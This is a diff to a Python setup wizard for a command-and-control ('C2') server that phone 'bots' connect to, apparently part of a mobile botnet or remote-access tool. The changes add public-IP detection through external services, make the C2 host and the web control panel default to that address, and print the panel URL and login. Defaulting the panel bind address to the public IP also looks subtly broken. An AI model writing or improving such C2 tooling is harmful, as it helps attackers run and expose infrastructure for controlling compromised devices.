@@ -91,6 +91,40 @@ def ask_bool(prompt: str, default: bool = False) -> bool:
     return default
 
 
+def detect_public_host() -> str:
+    """
+    Best-effort guess of the address a phone could use to reach this host.
+
+    The server's public IP is asked from an external service; when that is
+    not possible (no network, service blocked) the first non-loopback IPv4
+    address of the machine is used.
+    """
+    import socket
+    import urllib.request
+
+    for url in ("https://api.ipify.org", "https://ifconfig.me/ip",
+                "https://icanhazip.com"):
+        try:
+            with urllib.request.urlopen(url, timeout=5) as r:
+                ip = r.read().decode().strip()
+            if ip and not ip.startswith(("127.", "0.")):
+                return ip
+        except Exception:
+            continue
+
+    # Fall back to a local address.
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        if ip and not ip.startswith("127."):
+            return ip
+    except Exception:
+        pass
+    return "127.0.0.1"
+
+
 def choose_interface() -> str:
     """Asks whether to deploy the bot interface or the web interface."""
     print()
@@ -162,8 +196,17 @@ def run_wizard() -> dict:
     else:
         c2_bind = ask("  Bind address (where the C2 listens)",
                       existing.get("c2", {}).get("bind", "0.0.0.0"))
-        c2_host = ask("  Address the bots connect to",
-                      existing.get("c2", {}).get("host", c2_bind))
+        # The advertised address must be reachable FROM the phone, so it
+        # cannot default to the wildcard bind address.
+        default_host = existing.get("c2", {}).get("host", "")
+        if default_host in ("", "0.0.0.0", "::"):
+            default_host = detect_public_host()
+        c2_host = ask("  Address the bots connect to (public IP or hostname)",
+                      default_host)
+        if c2_host in ("0.0.0.0", "::", ""):
+            print(_c("  ! 0.0.0.0 is not reachable from a phone, "
+                     "using the detected address", YELLOW))
+            c2_host = detect_public_host()
         c2_port = ask_int("  C2 port", int(existing.get("c2", {}).get("port", 8777)))
         protocol = ask("  Encryption [tcp/tls]",
                        existing.get("c2", {}).get("protocol", "tcp")).lower()
@@ -205,7 +248,10 @@ def run_wizard() -> dict:
     if mode == "web":
         print()
         print(_c("  Web panel", BOLD))
-        cfg["web"]["host"] = ask("  Bind address", cfg["web"]["host"])
+        # Default to the public address so the printed URL is actually
+        # reachable from a browser on another machine.
+        cfg["web"]["host"] = ask("  Bind address",
+                                 detect_public_host())
         cfg["web"]["port"] = ask_int("  Panel port", cfg["web"]["port"])
         cfg["web"]["username"] = ask("  Username", cfg["web"]["username"])
         pwd = ask("  Password (empty = generate)", "")
@@ -251,10 +297,23 @@ def print_summary(cfg: dict, path: str = ""):
         print(f"  Bots connect to: {c2.get('host')}:{c2.get('port')}")
     print(f"  Shared secret  : {secret}")
     if cfg.get("mode") == "web":
-        print(f"  Panel URL      : http://{web.get('host')}:{web.get('port')}/")
-        print(f"  Panel login    : {web.get('username')}")
+        # A wildcard bind address is not a usable URL for the operator, so
+        # the detected public address is shown instead.
+        shown_host = web.get("host", "127.0.0.1")
+        if shown_host in ("0.0.0.0", "::", ""):
+            shown_host = detect_public_host()
+        url = f"http://{shown_host}:{web.get('port')}/"
+        print()
+        print(_c("  Panel URL      : " + url, GREEN + BOLD))
+        print(_c("  Panel login    : " + str(web.get("username", "admin")), GREEN))
         if web.get("password"):
-            print(f"  Panel password : {web.get('password')}")
+            print(_c("  Panel password : " + str(web.get("password")), GREEN))
+        if web.get("host") in ("0.0.0.0", "::"):
+            print(_c("  ! the panel binds to " + str(web.get("host"))
+                     + "; reach it through the firewall, a tunnel or a proxy", YELLOW))
+        elif web.get("host") in ("127.0.0.1", "localhost"):
+            print(_c("  ! the panel only listens on loopback; it is reachable "
+                     "from this machine only", YELLOW))
     else:
         print("  Panel URL      : (bot interface only, no web UI)")
     print()
